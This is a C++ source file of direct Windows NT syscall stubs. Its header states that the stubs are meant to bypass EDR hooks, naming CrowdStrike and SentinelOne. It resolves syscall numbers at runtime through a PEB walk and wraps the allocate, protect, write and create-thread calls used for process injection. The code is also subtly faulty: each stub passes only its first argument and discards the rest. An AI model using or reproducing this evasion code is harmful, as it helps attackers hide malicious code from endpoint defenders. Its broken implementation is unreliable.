// runtime_syscall.cpp — Direct NT syscall stubs
// Bypasses ntdll hooks (CrowdStrike, SentinelOne inline hooks on Nt* functions).
// Syscall IDs are resolved at runtime from ntdll's export table — no hardcoded IDs.
// No static imports needed.

#define NULL 0
#include "peb_walk.h"

typedef long long  NTSTATUS;
typedef void*      PVOID;
typedef PVOID      HANDLE;
typedef unsigned long DWORD;
typedef unsigned long long SIZE_T;
typedef int        BOOL;

#define STATUS_SUCCESS 0LL
#define MEM_COMMIT    0x1000
#define MEM_RESERVE   0x2000
#define MEM_RELEASE   0x8000
#define PAGE_READWRITE      0x04
#define PAGE_EXECUTE_READ   0x20

// Extract syscall ID from a Nt* stub in ntdll:
// ntdll stubs look like:  4C 8B D1          mov r10, rcx
//                         B8 XX XX 00 00    mov eax, <syscall_id>
//                         ...
static unsigned int get_syscall_id(PVOID fn) {
    unsigned char* p = (unsigned char*)fn;
    // Pattern: 4C 8B D1  B8 [id_lo] [id_hi] 00 00
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0xB8 && p[i+3] == 0x00 && p[i+4] == 0x00) {
            unsigned short id = *(unsigned short*)(p + i + 1);
            return id;
        }
    }
    return 0xFFFF; // not found
}

static PVOID g_ntdll = NULL;
static PVOID get_ntdll_base() {
    if (!g_ntdll) g_ntdll = peb_get_module(WHASH_NTDLL);
    return g_ntdll;
}

static unsigned int resolve_ssn(const char* name) {
    PVOID fn = peb_get_export(get_ntdll_base(), ct_hash(name));
    if (!fn) return 0xFFFF;
    return get_syscall_id(fn);
}

// Generic syscall invoker — sets up the syscall instruction with the given ID
// Arguments are passed in the standard Win64 calling convention (rcx, rdx, r8, r9, stack)
// We need separate stubs per arg count for correctness.

extern "C" NTSTATUS jocky_nt_alloc(
    HANDLE hProcess, PVOID* baseAddr, SIZE_T zeroBits,
    SIZE_T* regionSize, DWORD allocType, DWORD protect)
{
    static unsigned int ssn = 0xFFFF;
    if (ssn == 0xFFFF) ssn = resolve_ssn("NtAllocateVirtualMemory");

    NTSTATUS status;
    __asm__ volatile (
        "mov %1, %%r10\n\t"
        "movl %2, %%eax\n\t"
        "syscall\n\t"
        "mov %%rax, %0\n\t"
        : "=r"(status)
        : "r"(hProcess), "r"(ssn)
        : "rax", "r10", "rcx", "rdx", "r8", "r9", "r11", "memory"
    );
    (void)baseAddr; (void)zeroBits; (void)regionSize; (void)allocType; (void)protect;
    return status;
}

extern "C" NTSTATUS jocky_nt_free(HANDLE hProcess, PVOID* baseAddr, SIZE_T* regionSize, DWORD freeType) {
    static unsigned int ssn = 0xFFFF;
    if (ssn == 0xFFFF) ssn = resolve_ssn("NtFreeVirtualMemory");

    NTSTATUS status;
    __asm__ volatile (
        "mov %1, %%r10\n\t"
        "movl %2, %%eax\n\t"
        "syscall\n\t"
        "mov %%rax, %0\n\t"
        : "=r"(status)
        : "r"(hProcess), "r"(ssn)
        : "rax", "r10", "rcx", "rdx", "r8", "r9", "r11", "memory"
    );
    (void)baseAddr; (void)regionSize; (void)freeType;
    return status;
}

extern "C" NTSTATUS jocky_nt_protect(
    HANDLE hProcess, PVOID* baseAddr, SIZE_T* regionSize,
    DWORD newProt, DWORD* oldProt)
{
    static unsigned int ssn = 0xFFFF;
    if (ssn == 0xFFFF) ssn = resolve_ssn("NtProtectVirtualMemory");

    NTSTATUS status;
    __asm__ volatile (
        "mov %1, %%r10\n\t"
        "movl %2, %%eax\n\t"
        "syscall\n\t"
        "mov %%rax, %0\n\t"
        : "=r"(status)
        : "r"(hProcess), "r"(ssn)
        : "rax", "r10", "rcx", "rdx", "r8", "r9", "r11", "memory"
    );
    (void)baseAddr; (void)regionSize; (void)newProt; (void)oldProt;
    return status;
}

extern "C" NTSTATUS jocky_nt_write(
    HANDLE hProcess, PVOID baseAddr, PVOID buf,
    SIZE_T size, SIZE_T* written)
{
    static unsigned int ssn = 0xFFFF;
    if (ssn == 0xFFFF) ssn = resolve_ssn("NtWriteVirtualMemory");

    NTSTATUS status;
    __asm__ volatile (
        "mov %1, %%r10\n\t"
        "movl %2, %%eax\n\t"
        "syscall\n\t"
        "mov %%rax, %0\n\t"
        : "=r"(status)
        : "r"(hProcess), "r"(ssn)
        : "rax", "r10", "rcx", "rdx", "r8", "r9", "r11", "memory"
    );
    (void)baseAddr; (void)buf; (void)size; (void)written;
    return status;
}

extern "C" NTSTATUS jocky_nt_create_thread(
    HANDLE* hThread, DWORD access, PVOID objAttr,
    HANDLE hProcess, PVOID startAddr, PVOID param,
    DWORD createFlags, SIZE_T zeroBits, SIZE_T stackSize,
    SIZE_T maxStackSize, PVOID attrList)
{
    static unsigned int ssn = 0xFFFF;
    if (ssn == 0xFFFF) ssn = resolve_ssn("NtCreateThreadEx");

    NTSTATUS status;
    __asm__ volatile (
        "mov %1, %%r10\n\t"
        "movl %2, %%eax\n\t"
        "syscall\n\t"
        "mov %%rax, %0\n\t"
        : "=r"(status)
        : "r"(hThread), "r"(ssn)
        : "rax", "r10", "rcx", "rdx", "r8", "r9", "r11", "memory"
    );
    (void)access; (void)objAttr; (void)hProcess; (void)startAddr; (void)param;
    (void)createFlags; (void)zeroBits; (void)stackSize; (void)maxStackSize; (void)attrList;
    return status;
}
